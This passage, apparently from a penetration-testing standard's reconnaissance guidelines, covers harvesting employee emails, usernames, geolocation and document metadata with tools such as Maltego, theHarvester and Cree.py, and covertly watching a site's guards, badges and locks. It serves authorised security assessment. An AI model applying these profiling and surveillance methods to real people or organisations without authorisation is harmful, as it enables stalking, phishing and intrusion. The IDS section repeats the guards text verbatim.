http://www.mychurch.org/ http://www.mychurch.org ] |Christian Churches |- |MyHeritage |[ http://www.myheritage.com/ http://www.myheritage.com ] |family-oriented social network service |- |MyLife |[ http://www.mylife.com/ http://www.mylife.com ] |Locating friends and family, keeping in touch (formerly Reunion.com) |- |My Opera |[ http://my.opera.com/ http://my.opera.com ] |Blogging, mobile blogging, photo sharing, connecting with friends, Opera Link and Opera Unite. Global |- |Myspace |[ http://www.myspace.com/ http://www.myspace.com ] |General |- |myYearbook |[ http://www.myyearbook.com/ http://www.myyearbook.com ] |General, Charity |- |Nasza-klasa.pl |[ http://www.nk.pl/ http://www.nk.pl ] |School, college and friends. Popular in Poland |- |Netlog |[ http://www.netlog.com/ http://www.netlog.com ] |General. Popular in Europe, Turkey, the Arab World and Canada's Qu\u00c8bec province. Formerly known as Facebox and Redbox. |- |Nettby |[ http://www.nettby.no/ http://www.nettby.no ] |Norwegian Community |- |Nexopia |[ http://www.nexopia.com/ http://www.nexopia.com ] |Canada |- |NGO Post |[ http://www.ngopost.org/ http://www.ngopost.org ] |Non-Profit news sharing and networking, mainly in India |- |Ning |[ http://www.ngopost.org/ http://www.ngopost.org ] |Users create their own social websites and social networks |- |Odnoklassniki |[ http://odnoklassniki.ru/ http://odnoklassniki.ru ] |Connect with old classmates. Popular in Russia and former Soviet republics |- |OneClimate |[ http://www.oneclimate.net/ http://www.oneclimate.net ] |Not for Profit Social networking and Climate Change |- |OneWorldTV |[ http://tv.oneworld.net/ http://tv.oneworld.net ] |Not for Profit Video sharing and social networking aimed at people interested in social issues, development, environment, etc. |- |Open Diary |[ http://www.opendiary.com/ http://www.opendiary.com ] |First online blogging community, founded in 1998 |- |Orkut |[ http://orkut.com/ http://orkut.com ] |General. Owned by Google Inc. Popular in India and Brazil. |- |OUTeverywhere |[ http://www.outeverywhere.com/ http://www.outeverywhere.com ] |Gay/LGBTQ Community |- |Passportstamp |[ http://www.passportstamp.com/ http://www.passportstamp.com ] |Travel |- |Partyflock |[ http://partyflock.nl/ http://partyflock.nl ] |Dutch virtual community for people interested in house music and other electronic dance music. Since 2001, Partyflock has evolved into the biggest online community for the dance scene in the Netherlands |- |Picasa |[ http://picasa.google.com/ http://picasa.google.com ] | |- |PicFog |[ http://picfog.com/ http://picfog.com ] |PicFog shows pictures from twitter ''as'' they're posted |- |Pingsta |[ http://www.pingsta.com/ http://www.pingsta.com ] |Collaborative platform for the world's Internetwork Experts |- |Plaxo |[ http://www.plaxo.com/ http://www.plaxo.com ] |Aggregator |- |Playahead |[ http://www.playahead.se/ http://www.playahead.se ] |Swedish, Danish teenagers |- |Playlist.com |[ http://www.playlist.com/ http://www.playlist.com ] |General, Music |- |Plurk |[ http://www.plurk.com/ http://www.plurk.com ] |Micro-blogging, RSS, updates. Very popular in Taiwan |- |Present.ly |[ http://www.presently.com/ http://www.presently.com ] |Enterprise social networking and micro-blogging |- |Qapacity |[ http://www.qapacity.com/ http://www.qapacity.com ] |A a business-oriented social networking site and a business directory |- |Quechup |[ http://quechup.com/ http://quechup.com ] |General, friendship, dating |- |Qzone |[ http://qzone.qq.com/ http://qzone.qq.com ] |General. In Simplified Chinese; caters for mainland China users |- |Raptr |[ http://raptr.com/ http://raptr.com ] |Video games |- |Ravelry |[ http://www.ravelry.com/ http://www.ravelry.com ] |Knitting and crochet |- |Renren |[ http://renren.com/ http://renren.com ] |Significant site in China. |- |ResearchGate |[ http://researchgate.net/ http://researchgate.net ] |Social network for scientific researchers |- |ReverbNation.com |[ http://www.reverbnation.com/ http://www.reverbnation.com ] |Social network for musician and bands |- |Ryze |[ http://www.ryze.com/ http://www.ryze.com ] |Business |- |ScienceStage |[ http://sciencestage.com/ http://sciencestage.com ] |Science-oriented multimedia platform and network for scientists |- |Scispace.net |[ http://scispace.net/ http://scispace.net ] |Collaborative network site for scientists |- |ShareTheMusic |[ http://www.sharethemusic.com/ http://www.sharethemusic.com ] |Music Community. Sharing and listening to music for free and legally |- |Shelfari |[ http://www.shelfari.com/ http://www.shelfari.com ] |Books |- |Skyrock |[ http://skyrock.com/ http://skyrock.com ] |Social Network in French-speaking world |- |Social Life |[ http://www.sociallife.com.br/ http://www.sociallife.com.br ] |Brazilian jet set and social elite world-wide |- |SocialVibe |[ http://www.socialvibe.com/ http://www.socialvibe.com ] |Social Network for Charity |- |Sonico.com |[ http://www.sonico.com/ http://www.sonico.com ] |General. Popular in Latin America and Spanish and Portuguese speaking regions. |- |Stickam |[ http://www.stickam.com/ http://www.stickam.com ] |Live video streaming and chat. |- |StudiVZ |[ http://www.studivz.net/ http://www.studivz.net ] |University students, mostly in the German-speaking countries. School students and those out of education sign up via its partner sites sch\u00b8lerVZ and meinVZ. |- |StumbleUpon |[ http://www.stumbleupon.com/ http://www.stumbleupon.com ] |Stumble through websites that match your selected interests |- |Tagged |[ http://www.tagged.com/ http://www.tagged.com ] |General. Subject to quite some controversy about its e-mail marketing and privacy policy |- |Talkbiznow |[ http://www.talkbiznow.com/ http://www.talkbiznow.com ] |Business networking |- |Taltopia |[ http://www.taltopia.com/ http://www.taltopia.com ] |Online artistic community |- |Taringa! |[ http://www.taringa.net/ http://www.taringa.net ] |General |- |TeachStreet |[ http://www.teachstreet.com/ http://www.teachstreet.com ] |Education / Learning / Teaching - More than 400 subjects |- |TravBuddy.com |[ http://www.travbuddy.com/ http://www.travbuddy.com ] |Travel |- |Travellerspoint |[ http://www.travellerspoint.com/ http://www.travellerspoint.com ] |Travel |- |tribe.net |[ http://www.tribe.net/ http://www.tribe.net ] |General |- |Trombi.com |[ http://www.trombi.com/ http://www.trombi.com ] |French subsidiary of Classmates.com |- |Tuenti |[ http://www.tuenti.com/ http://www.tuenti.com ] |Spanish-based university and High School social network. Very Popular in Spain |- |Tumblr |[ http://www.tumblr.com/ http://www.tumblr.com ] |General. Micro-blogging, RSS |- |Twitter |[ http://twitter.com/ http://twitter.com ] |General. Micro-blogging, RSS, updates |- |twitpic |[ http://twitpic.com/ http://twitpic.com ] | |- |Vkontakte |[ http://vkontakte.ru/ http://vkontakte.ru/ ] |Social Network for Russian-speaking world including former Soviet republics. Biggest site in Russia |- |Vampirefreaks.com |[ http://www.vampirefreaks.com/ http://www.vampirefreaks.com ] |Gothic and industrial subculture |- |Viadeo |[ http://www.viadeo.com/ http://www.viadeo.com ] |Global Social Networking and Campus Networking available in English, French, German, Spanish, Italian and Portuguese |- |Virb |[ http://www.virb.com/ http://www.virb.com ] |Social network that focuses heavily on artists, including musicians and photographers |- |Vox |[ http://www.vox.com/ http://www.vox.com ] |Blogging |- |Wakoopa |[ http://social.wakoopa.com/ http://social.wakoopa.com ] |For computer fans that want to discover new software and games |- |Wattpad |[ http://www.wattpad.com/ http://www.wattpad.com ] |For readers and authors to interact & e-book sharing |- |Wasabi |[ http://www.wasabi.com/ http://www.wasabi.com ] |General. UK-based. |- |WAYN |[ http://www.wayn.com/ http://www.wayn.com ] |Travel and lifestyle |- |WebBiographies |[ http://www.webbiographies.com/ http://www.webbiographies.com ] |Genealogy and biography |- |WeeWorld |[ http://www.weeworld.com/ http://www.weeworld.com ] |Teenagers - 10 to 17 |- |WeOurFamily |[ http://www.weourfamily.com/ http://www.weourfamily.com ] |General with emphasis on privacy and security |- |Wer-kennt-wen |[ http://www.wer-kennt-wen.de/ http://www.wer-kennt-wen.de ] |General |- |weRead |[ http://weread.com/ http://weread.com ] |Books |- |Windows Live Spaces |[ http://spaces.live.com/ http://spaces.live.com ] |Blogging (formerly MSN Spaces) |- |WiserEarth |[ http://www.wiserearth.org/ http://www.wiserearth.org ] |Online community space for the social justice and environmental movement |- |Wordpress |[ http://wordpress.org/ http://wordpress.org ] | |- |WorldFriends |[ http://www.worldfriends.tv/ http://www.worldfriends.tv ] | |- |Xanga |[ http://www.xanga.com/ http://www.xanga.com ] |Blogs and \"metro\" areas |- |XING |[ http://www.xing.com/ http://www.xing.com ] |Business (primarily Europe (Germany, Austria, Switzerland) and China) |- |Xt3 |[ http://www.xt3.com/ http://www.xt3.com ] |Catholic social networking, created after World Youth Day 2008 |- |Yammer |[ http://www.yammer.com/ http://www.yammer.com ] |Social networking for office colleagues |- |Yelp, Inc. |[ http://www.yelp.com/ http://www.yelp.com ] |Local Business Review and Talk |- |Yfrog |[ http://yfrog.com/ http://yfrog.com ] | |- |Youmeo |[ http://youmeo.com/ http://youmeo.com ] |UK Social Network (focus on data portability) |- |Zoo.gr |[ http://www.zoo.gr/ http://www.zoo.gr ] |Greek Web Meeting point |- |Zooppa |[ http://zooppa.com/ http://zooppa.com ] |Online Community for Creative Talent (host of brand sponsored advertising contests) |} '''Tone and Frequency''' Identifying an employee's tone and frequency of postings can be a critical indicator of a disgruntled employee as well as the corporate acceptance of social networking. While time consuming it is possible to establish an employee's work schedule and vacation periods. '''Location awareness''' Most social networking sites offer the ability to include geolocation information in postings. This information can be useful in identifying exactly where the person was physically located when a posting was made. In addition, it is possible that geolocation information is included in images that are uploaded to social networking sites. It is possible that the user may be savy enough to turn this off, however, sometimes it's just as simple as reading a post that indicates exactly where they're located.","title":"Social Networking Websites"},{"location":"pentest_standard/tecguidelines/#creepy","text":"Cree.py is Beta tool that is used to automate the task of information gathering from Twitter as well as FourSquare. In addition, Cree.py can gather any geolocation data from flickr, twitpic.com, yfrog.com, img.ly, plixi.com, twitrpix.com, foleext.com, shozu.com, pickhur.com, moby.to, twitsnaps.com and twitgoo.com. Cree.py is an open source intelligence gathering application. To install Cree.py, you will need to add a repository to your /etc/apt/sources.list. echo \"deb http://people.dsv.su.se/~kakavas/creepy/ binary/\" >> /etc/apt/sources.list Update package list apt-get update Install creepy apt-get install creepy [[:File:Penetration_Testing_Execution_03.png|Cree.py Interface]] Cree.py is primarily targeting geolocation related information about users from social networking platforms and image hosting services. The information is presented in a map inside the application where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to provide context to the presentation. [[:File:Penetration_Testing_Execution_04.png|Cree.py Interface]]","title":"Cree.py"},{"location":"pentest_standard/tecguidelines/#internet-footprint","text":"Internet Footprinting is where we attempt to gather externally available information about the target infrastructure that we can leveraged in later phases.","title":"Internet Footprint"},{"location":"pentest_standard/tecguidelines/#email-addresses","text":"Gathering email addresses while seemingly useless can provide us with valuable information about the target environment. It can provide information about potential naming conventions as well as potential targets for later use. There are many tools that can be used to gather email addresses, Maltego for example.","title":"Email addresses"},{"location":"pentest_standard/tecguidelines/#maltego","text":"Paterva [ http://www.paterva.com/ Maltego] is used to automate the task of information gathering. Maltego is an open source intelligence and forensics application. Essentially, Maltego is a data mining and information-gathering tool that maps the information gathered into a format that is easily understood and manipulated. It saves you time by automating tasks such as email harvesting and mapping subdomains. The documentation of Maltego is relatively sparse so we are including the procedures necessary to obtain the data required. Once you have started Maltego, the main interface should be visible. The six main areas of the interface are the toolbar, the Palette, graph(view) area, overview area, the detailed area, and the property area. ''' [[:File:Penetration_Testing_Execution_05.png|Screenshot Here]] ''' Here is a suggested workflow to get you started, consider it a training exercise rather than absolute since you will want to customize your workflow depending on your engagement. To start, look to the very upper left-hand corner of Maltego and click the \"new graph\" button. After that, drag the \"domain\" item out of the palette onto the graph. The graph area allows you to process the transforms as well as view the data in either the mining view, dynamic view, edge weighted view as well as the entity list. When you first add the domain icon to your graph, it will default to \"paterva.com\" double-click on that icon and change the name to your target's domain(without any subdomain such as www). Now you are ready to start mining. Right click(or double-click) on the domain icon and from \"run transform\" select the \"To Website DNS[using search engine]\". This will hopefully result in all of the subdomains for your target showing up. Select all of the subdomains and run the \"To IP Address [DNS] transform\". This should resolve all of the subdomains to their respective IP Addresses. ''' [[:File:Penetration_Testing_Execution_07.png|Screenshot Here]] ''' From this point you could chose a couple different paths depending on the size of your target but a logical next step is to determine the netblocks so run the \"To Netblock [Using natural boundaries]\" transform. After this point, you should be able to use your imagination as to where to go next. You will be able to cultivate phone numbers, email addresses, geo location information and much more by using the transforms provided. The Palette contains all the transforms that are available (or activated) for use. As of this writing, there are approximately 72 transforms. One limitation of the \"Community Edition\" of Maltego is that any given transform will only return 12 results whereas the professional version doesn't have any limitations. Resist the temptation to run \"all transforms\" since this will likely overload you with data and inhibit your ability to drill down to the most interesting pieces of data that are relevant to your engagement. Maltego is not just limited to the pre-engagement portion of your pentest. You can also import csv/xls dumps of your airodump results back into Maltego to help you visualize the networks.","title":"Maltego"},{"location":"pentest_standard/tecguidelines/#theharvester","text":"TheHarvester is a tool, written by Christian Martorella, that can be used to gather e-mail accounts and subdomain names from different public sources (search engines, pgp key servers). Is a really simple tool, but very effective. root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py ************************************* *TheHarvester Ver. 1.6 * *Coded by Christian Martorella * *Edge-Security Research * *cmartorella@edge-security.com * ************************************* Usage: theharvester options -d: domain to search or company name -b: data source (google,bing,pgp,linkedin) -s: start in result number X (default 0) -v: verify host name via dns resolution -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp does'nt use this option) Examples:./theharvester.py -d microsoft.com -l 500 -b google ./theharvester.py -d microsoft.com -b pgp ./theharvester.py -d microsoft -l 200 -b linkedin TheHarvester will search the specified data source and return the results. This should be added to the OSINT document for use at a later stage. root@pentest:/pentest/enumeration/theharvester# ./theHarvester.py -d client.com -b google -l 500 ************************************* *TheHarvester Ver. 1.6 * *Coded by Christian Martorella * *Edge-Security Research * *cmartorella@edge-security.com * ************************************* Searching for client.com in google : ###################################### Limit: 500 Searching results: 0 Searching results: 100 Searching results: 200 Searching results: 300 Searching results: 400 Accounts found: #################### admin@client.com nick@client.com jane@client.com sarah@client.com","title":"TheHarvester"},{"location":"pentest_standard/tecguidelines/#netglub","text":"NetGlub is an open source tool that is very similar to Maltego. NetGlub is a data mining and information-gathering tool that presents the information gathered in a format that is easily understood. The documentation of NetGlub is nonexistent at the moment so we are including the procedures necessary to obtain the data required. Installing NetGlub is not a trivial task, but one that can be accomplished by running the following: apt-get install build-essential mysql-server libmysqlclient-dev zlib1g-dev libperl-dev libnet-ip-perl libopenssl-ruby ruby-dev ruby omt php5-cli nmap libnet-dns-perl libnet-ip-perl python-dev wget http://pypi.python.org/packages/source/s/simplejson/simplejson-2.1.5.tar.gz tar -xzvf simplejson-2.1.5.tar.gz cd simplejson-2.1.5 python2.7 setup.py build python2.7 setup.py install cd .. wget http://sourceforge.net/projects/pyxml/files/pyxml/0.8.4/PyXML-0.8.4.tar.gz tar -xvzf PyXML-0.8.4.tar.gz cd PyXML-0.8.4 wget http://launchpadlibrarian.net/31786748/0001-Patch-for-Python-2.6.patch patch -p1 < 0001-Patch-for-Python-2.6.patch python setup.py install cd /pentest/enumeration At this point we're going to use a GUI installation of the QT-SDK. The main thing to point out here is that the installation path needs to be changed during the installation to reflect /opt/qtsdk. If you use a different path, then you will need to update the paths in the script below to reflect that difference. Note that during the QT-SDK installation we are reminded for external dependencies, so make sure we run \"apt-get install libglib2.0-dev libSM-dev libxrender-dev libfontconfig1-dev libxext-dev\". wget http://blog.hynesim.org/ressources/install/qt-sdk-linux-x86-opensource-2010.03.bin chmod +x qt-sdk-linux-x86-opensource-2010.03.bin ./qt-sdk-linux-x86-opensource-2010.03.bin wget http://www.graphviz.org/pub/graphviz/stable/SOURCES/graphviz-2.26.3.tar.gz tar -xzvf graphviz-2.26.3.tar.gz cd graphviz-2.26.3 ./configure make make install cd /pentest/enumeration wget http://redmine.lab.diateam.net/attachments/download/1/netglub-1.0.tar.gz tar -xzvf netglub-1.0.tar.gz mv netglub-1.0 netglub cd /pentest/enumeration/netglub/qng/ /opt/qtsdk/qt/bin/qmake make Now we need to start MySQL and create the netglub database start mysql mysql -u root -ptoor create database netglub; use netglub; create user \"netglub\"@\"localhost\"; set password for \"netglub\"@\"localhost\" # password(\"netglub\"); GRANT ALL ON netglub.* TO \"netglub\"@\"localhost\"; quit mysql -u root -ptoor netglub < /pentest/enumeration/netglub/master/tools/sql/netglub.sql cd /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/ /opt/qtsdk/qt/bin/qmake INCLUDEPATH+#/usr/include/mysql/ make cp /opt/qtsdk/qt/src/plugins/sqldrivers/mysql/libqsqlmysql.so /opt/qtsdk/qt/plugins/sqldrivers/. cd /pentest/enumeration/netglub/master /opt/qtsdk/qt/bin/qmake make cd tools/ ./install.sh cd /pentest/enumeration/netglub/slave /opt/qtsdk/qt/bin/qmake make cd tools/ ./install.sh wget http://sourceforge.net/projects/xmlrpc-c/files/Xmlrpc-c%20Super%20Stable/1.16.34/xmlrpc-c-1.16.34.tgz/download tar -zxvf xmlrpc-c-1.16.34.tgz cd xmlrpc-c-1.16.34 ./configure make make install Once you have installed NetGlub, you'll probably be interested in running it. This is really a four step process: Ensure that MySQL is running: start mysql Start the NetGlub Master: /pentest/enumeration/netglub/master/master Start the NetGlub Slave: /pentest/enumeration/netglub/slave/slave Start the NetGlub GUI: /pentest/enumeration/netglub/qng/bin/unix-debug/netglub Now the main interface should be visible. If you are familiar with Maltego, then you will feel right at home with the interface. The six main areas of the interface are the toolbar, the Palette, graph, (or view) area, details, and the property area. ''' [[:File:Penetration_Testing_Execution_166.png|Screenshot Here]] ''' A complete list of all the transforms that are available (or activated) for use. As of this writing, there are approximately 33 transforms. A transform is script that will actually perform the action against a given site. ''' [[:File:Penetration_Testing_Execution_167.png|Screenshot Here]] ''' The graph area allows you to process the transforms as well as view the data in either the mining view, dynamic view, edge weighted view as well as the entity list. The overview area provides a mini-map of the entities discovered based upon the transforms. The detail area is where it is possible to drill into the specifics of the entity. It is possible to view such things as the relationships, as well as details of how the information was generated. The property area allows you to see the specific properties of the transform populated with the results specific to the entity. To begin using NetGlub we need to drag and drop a transform from the Palette to the Graph Area. By default, this will be populated with dummy data. To edit the entity within the selected transform, do so by editing the entries within the property view. We first need to determine the Internet infrastructure such as Domains. To perform this we will drag and drop the Domain transform to the graph area. Edit the transform to reflect the appropriate domain name for the client. It is possible to collect nearly all the data that we will initially require by clicking on Run All Transforms. The data from these entities will be used to obtain additional information. Within the graph area the results will be visible as illustrated below. ''' [[:File:Penetration_Testing_Execution_168.png|Screenshot Here]] ''' Selecting the entities and choosing to run additional transforms the data collected will expand. If a particular transform has not be used that you want to collect data from, simply drag it to the graph area and make the appropriate changes within the property view. There will be some information that you will need to enter to ensure that NetGlub functions properly. For example, you will need to enter in DNS servers which to query. In addition, you will be asked to provide your Alchemy and Open calais API keys. For Alchemy, you will need to go to [ http://www.alchemyapi.com/api/register.html http://www.alchemyapi.com/api/register.html ] to receive your own API key. For Open calais, you will need to go to [ http://www.opencalais.com/APIkey http://www.opencalais.com/APIkey ] to receive your own API key.","title":"NetGlub"},{"location":"pentest_standard/tecguidelines/#usernameshandles","text":"Identifying usernames and handles that are associated with a particular email is useful as this might provide several key pieces of information. For instance, it could provide a significant clue for username and passwords. In addition, it can also indicate a particular individual's interest outside of work. A good place to location this type of information is within discussion groups (Newsgroups, Mailing lists, forums, chat rooms, etc.).","title":"Usernames/Handles"},{"location":"pentest_standard/tecguidelines/#social-networks","text":"[ http://www.checkusernames.com/ Check Usernames] - Useful for checking the existence of a given username across 160 Social Networks.","title":"Social Networks"},{"location":"pentest_standard/tecguidelines/#newsgroups","text":"[ http://www.google.com/ Google] - [ http://www.google.com/ http://www.google.com ] [ http://groups.yahoo.com/ Yahoo Groups] - [ http://groups.yahoo.com/ http://groups.yahoo.com ] [ http://www.delphiforums.com/ Delphi Forums ] - [ http://www.delphiforums.com/ http://www.delphiforums.com ] [ http://www.big-boards.com/ Big Boards] - [ http://www.big-boards.com/ http://www.big-boards.com ]","title":"Newsgroups"},{"location":"pentest_standard/tecguidelines/#mailing-lists","text":"TILE.Net - [ http://tile.net/lists http://tile.net/lists ] Topica - [ http://lists.topica.com/ http://lists.topica.com ] L-Soft CataList, the Official Catalog of LISTSERV lists - [ http://www.lsoft.com/lists/listref.html http://www.lsoft.com/lists/listref.html ] The Mail Archive - [ http://www.mail-archive.com/ http://www.mail-archive.com ]","title":"Mailing Lists"},{"location":"pentest_standard/tecguidelines/#chat-rooms","text":"SearchIRC - [ http://searchirc.com/ http://searchirc.com ] Gogloom - [ http://www.gogloom.com/ http://www.gogloom.com ]","title":"Chat Rooms"},{"location":"pentest_standard/tecguidelines/#forums-search","text":"BoardReader - [ http://boardreader.com/ http://boardreader.com ] Omgili - [ http://www.omgili.com/ http://www.omgili.com ]","title":"Forums Search"},{"location":"pentest_standard/tecguidelines/#personal-domain-names","text":"The ability to locate personal domains that belong to target employees can yield additional information such as potential usernames and passwords. In addition, it can also indicate a particular individual's interest outside of work.","title":"Personal Domain Names"},{"location":"pentest_standard/tecguidelines/#personal-activities","text":"It is not uncommon for individuals to create and publish audio files and videos. While these may be seem insignificant, they can yield additional information about a particular individual's interest outside of work.","title":"Personal Activities"},{"location":"pentest_standard/tecguidelines/#audio","text":"iTunes - [ http://www.apple.com/itunes http://www.apple.com/itunes ] Podcast.com - [ http://podcast.com/ http://podcast.com ] Podcast Directory - [ http://www.podcastdirectory.com/ http://www.podcastdirectory.com ] Yahoo! Audio Search - [ http://audio.search.yahoo.com/ http://audio.search.yahoo.com ]","title":"Audio"},{"location":"pentest_standard/tecguidelines/#video","text":"YouTube - [ http://youtube.com/ http://youtube.com ] Yahoo Video - [ http://video.search.yahoo.com/ http://video.search.yahoo.com ] Google Video - [ http://video.google.com/ http://video.google.com ] Bing Video - [ http://www.bing.com/videos http://www.bing.com/videos ]","title":"Video"},{"location":"pentest_standard/tecguidelines/#archived-information","text":"There are times when we will be unable to access web site information due to the fact that the content may no longer be available from the original source. Being able to access archived copies of this information allows access to past information. There are several ways to access this archived information. The primary means is to utilize the cached results under Google's cached results. As part of an NVA, it is not uncommon to perform Google searches using specially targeted search strings: cache: < site.com > Note: Replace < site.com > with the name of the domain that you wish to perform the search on. An additional resource for archived information is the Wayback Machine ( http://www.archive.org ). ''' [[:File:Penetration_Testing_Execution_09.png|Screenshot Here]] '''","title":"Archived Information"},{"location":"pentest_standard/tecguidelines/#electronic-data","text":"Collection of electronic data in direct response to reconnaissance and intelligence gathering should be focused on the target business or individual.","title":"Electronic Data"},{"location":"pentest_standard/tecguidelines/#document-leakage","text":"Publicly available documents should be gathered for essential data (date, time, location specific information, language, and author). Data collected could provide insight into the current environment, operational procedures, employee training, and human file_suport.","title":"Document leakage"},{"location":"pentest_standard/tecguidelines/#metadata-leakage","text":"Identifying Metadata is possible using specialized search engine. The goal is to identify data that is relevant to the target corporation. It may be possible to identify locations, hardware, software and other relevant data from Social Networking posts. Some search engines that provide the ability to search for Metadata are as follows: ixquick - [ http://ixquick.com/ http://ixquick.com ] MetaCrawler - [ http://metacrawler.com/ http://metacrawler.com ] Dogpile - [ http://www.dogpile.com/ http://www.dogpile.com ] Search.com - [ http://www.search.com/ http://www.search.com ] Jeffery's Exif Viewer - [ http://regex.info/exif.cgi http://regex.info/exif.cgi ] In addition to search engines, several tools exist to collect files and gather information from various documents.","title":"Metadata leakage"},{"location":"pentest_standard/tecguidelines/#foca-windows","text":"FOCA is a tool that reads metadata from a wide range of document and media formats. FOCA pulls the relevant usernames, paths, software versions, printer details, and email addresses. This can all be performed without the need to individually download files.","title":"FOCA (Windows)"},{"location":"pentest_standard/tecguidelines/#foundstone-sitedigger-windows","text":"Foundstone has a tool, named SiteDigger, which allows us to search a domain using specially strings from both the Google Hacking Database (GHDB) and Foundstone Database (FSDB). This allows for slightly over 1640 potential queries available to discover additional information. ''' [[:File:Penetration_Testing_Execution_10.png|Screenshot Here]] ''' The specific queries scanned as well as the results of the queries are shown. To access the results of a query, simply double-click on the link provided to open in a browser.","title":"Foundstone SiteDigger (Windows)"},{"location":"pentest_standard/tecguidelines/#metagoofil-linuxwindows","text":"Metagoofil is a Linux based information gathering tool designed for extracting metadata of public documents (.pdf, .doc, .xls, .ppt, .odp, .ods) available on the client's websites. Metagoofil generates an html results page with the results of the metadata extracted, plus a list of potential usernames that could prove useful for brute force attacks. It also extracts paths and MAC address information from the metadata. Metagoofil has a few options available, but most are related to what specifically you want to target as well the number of results desired. ''' [[:File:Penetration_Testing_Execution_11.png|Screenshot Here]] ''' The command to run ''metagoofil ''is as follows: metagoofil.py -d < client domain > -l 100 -f all -o < client domain > .html -t micro-files","title":"Metagoofil (Linux/Windows)"},{"location":"pentest_standard/tecguidelines/#exif-reader-windows","text":"Exif Reader is image file analysis software for Windows. It analyzes and displays the shutter speed, flash condition, focal length, and other image information included in the Exif image format which is supported by almost all the latest digital cameras. Exif image files with an extension of JPG can be treated in the same manner as conventional JPEG files. This software analyzes JPEG files created by digital cameras and can be downloaded from [ http://www.takenet.or.jp/~ryuuji/minisoft/exifread/english http://www.takenet.or.jp/ ~ ryuuji/minisoft/exifread/english].","title":"Exif Reader (Windows)"},{"location":"pentest_standard/tecguidelines/#exiftool-windows-os-x","text":"Exif Tool is a Windows and OS X tool for reading Meta information. ExifTool supports a wide range of file formats. ExifTool can be downloaded from [ http://www.sno.phy.queensu.ca/~phil/exiftool http://www.sno.phy.queensu.ca/ ~ phil/exiftool].","title":"ExifTool (Windows/ OS X)"},{"location":"pentest_standard/tecguidelines/#image-search","text":"While not directly related to metadata, Tineye is also useful: http://www.tineye.com/ If a profile is found that includes a picture, but not a real name, Tineye can sometimes be used to find other profiles on the Internet that may have more information about a person (including personals sites).","title":"Image Search"},{"location":"pentest_standard/tecguidelines/#covert-gathering","text":"","title":"Covert gathering"},{"location":"pentest_standard/tecguidelines/#on-location-gathering","text":"On-Site visits also allow assessment personnel to observe and gather information about the physical, environmental, and operational security of the target.","title":"On-location gathering"},{"location":"pentest_standard/tecguidelines/#adjacent-facilities","text":"Once the physical locations have been identified, it is useful to identify the adjacent facilities. Adjacent facilities should be documented and if possible, include any observed shared facilities or services.","title":"Adjacent Facilities"},{"location":"pentest_standard/tecguidelines/#physical-security-inspections","text":"Covert Physical security inspections are used to ascertain the security posture of the target. These are conducted covertly, clandestinely and without any party knowing they are being inspected. Observation is the key component of this activity. Physical security measures that should be observed include physical security equipment, procedures, or devices used to protect from possible threats. A physical security inspection should include, but is not limited to the following:","title":"Physical security inspections"},{"location":"pentest_standard/tecguidelines/#security-guards","text":"Observing security guards (or security officer) is often the first step in assessing the most visible deterrence. Security guards are uniformed and act to protect property by maintaining a high visibility presence to deter illegal and inappropriate actions. By observing security guard movements directly it is possible to determine procedures in use or establish movement patterns. You will need to observe what the security guards are protecting. It is possible to utilize binoculars to observe any movement from a safe distance. Some security guards are trained and licensed to carry firearms for their own safety and for personnel they are entrusted to protect. The use of firearms by security guards should not be a surprise, if noted. This should be documented prior to beginning the engagement. If firearms are observed, ensure that precaution is taken not to take any further action unless specifically authorized and trained to do so.","title":"Security guards"},{"location":"pentest_standard/tecguidelines/#badge-usage","text":"Badge usage refers to a physical security method that involves the use of identification badges as a form of access control. Badging systems may be tied to a physical access control system or simply used as a visual validation mechanism. Observing individual badge usage is important to document. By observing, badge usage it may be possible to actually duplicate the specific badge being utilized. The specific items that should be noted are if the badge is required to be visible or shown to gain physical access to the property or facility. Badge usage should be documented and if possible, include observed validation procedures.","title":"Badge Usage"},{"location":"pentest_standard/tecguidelines/#locking-devices","text":"A locking device is a mechanical or electronic mechanism often implemented to prevent unauthorized ingress or egress. These can be as simple as a door lock, dead-bolt, or complex as a cipher lock. Observing the type and placement location of the locking devices on doors it is possible to determine if the door in primarily used for ingress or egress. You will need to observe what the locking devices are protecting. All observations should be documented prior, and if possible photographs taken.","title":"Locking devices"},{"location":"pentest_standard/tecguidelines/#intrusion-detection-systems-idsalarms","text":"Observing security guards (or security officer) is often the first step in assessing the most visible deterrence. Security guards are uniformed and act to protect property by maintaining a high visibility presence to deter illegal and inappropriate actions. By observing security guard movements directly it is possible to determine procedures in use or establish movement patterns. You will need to observe what the security guards are protecting. It is possible to utilize binoculars to observe any movement from a safe distance. Some security guards are trained and licensed to carry firearms for their own safety and for personnel they are entrusted to protect. The use of firearms by security guards should not be a surprise, if noted. This should be documented prior to beginning the engagement. If firearms are observed, ensure that precaution is taken not to take any further action unless specifically authorized and trained to do so.","title":"Intrusion detection systems (IDS)/Alarms"},{"location":"pentest_standard/tecguidelines/#security-lighting","text":"Security lighting is often used as a preventative and corrective measure on a physical piece of property. Security lighting may aid in the detection of intruders, act as deterrence to intruders, or in some cases simply to increase the feeling of safety. Security lighting is often an integral component to the environmental design of a facility. Security lighting includes floodlights and low pressure sodium vapor lights. Most Security lighting that is intended to be left on all night is of the high-intensity discharge lamp variety. Other lights may be activated by sensors such as passive infrared sensors (PIRs), turning on only when a person (or other mammal) approaches. PIR activated lamps will usually be incandescent bulbs so that they can activate instantly; energy saving is less important since they will not be on all the time. PIR sensor activation can increase both the deterrent effect (since the intruder knows that he has been detected) and the detection effect (since a person will be attracted to the sudden increase in light). Some PIR units can be set up to sound a chime as well as turn on the light. Most modern units have a photocell so that they only turn on when it is dark. While adequate lighting around a physical structure is deployed to reduce the risk of an intrusion, it is critical that the lighting be implemented properly as poorly arranged lighting can actually obstruct viewing the facility they're designed to protect. Security lighting may be subject to vandalism, possibly to reduce its effectiveness for a subsequent intrusion attempt. Thus security lights should either be mounted very high, or else protected by wire mesh or tough polycarbonate shields. Other lamps may be completely recessed from view and access, with the light directed out through a light pipe, or reflected from a polished aluminum or stainless steel mirror. For similar reasons high security installations may provide a stand-by power supply for their security lighting. Observe and document the type, number, and locations of security lighting in use.","title":"Security lighting"},{"location":"pentest_standard/tecguidelines/#surveillance-cctv-systems","text":"Surveillance/CCTV systems may be used to observe activities in and around a facility from a centralized area. Surveillance/CCTV systems may operate continuously or only when activated as required to monitor a particular event. More advanced Surveillance/CCTV systems utilize motion-detection devices to activate the system. IP-based Surveillance/CCTV cameras may be implemented for a more decentralized operation. Surveillance/CCTV cameras 